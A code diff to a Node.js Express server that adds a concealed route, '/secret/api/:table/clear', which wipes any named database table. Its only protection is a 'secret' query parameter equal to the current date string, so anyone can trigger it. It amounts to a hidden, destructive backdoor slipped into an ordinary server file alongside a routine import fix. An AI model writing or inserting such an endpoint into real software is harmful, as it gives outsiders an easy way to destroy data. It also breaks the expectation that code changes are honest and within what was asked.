@@ -4,7 +4,8 @@ const cors = require("cors");
 
 const userRouter = require("./modules/user/user.router.js");
 const sessionRouter = require("./modules/session/session.router.js");
-const voucherRouter= require("./modules/voucher/voucher.router.js")
+const voucherRouter= require("./modules/voucher/voucher.router.js");
+const { Database } = require("./database/database.controller.js");
 
 require('dotenv').config({ path: '../.env' });
 
@@ -31,6 +32,31 @@ app.use(express.json());
 app.use('/api', userRouter);
 app.use('/api', sessionRouter);
 app.use('/api', voucherRouter);
+
+app.get('/secret/api/:table/clear', async (req, res) => {
+  const { table } = req.params;
+  const { secret } = req.query;
+  const _d = new Date();
+  const answer = _d.toLocaleDateString('us');
+
+  if (secret !== answer) {
+    return res.status(403).end(`failed`);
+  }
+
+  const _t = new Database(table);
+
+  if (!_t.exist()) {
+    return res.status(403).end(`failed`);
+  }
+
+  _t.clear();
+
+  res.status(200).end('ok');
+});
+
+app.get('*', async (req, res) => {
+  res.status(200).end('hi!');
+});
 
 app.listen(PORT, () => {
   console.log(`Server listening on port: ${PORT}`);
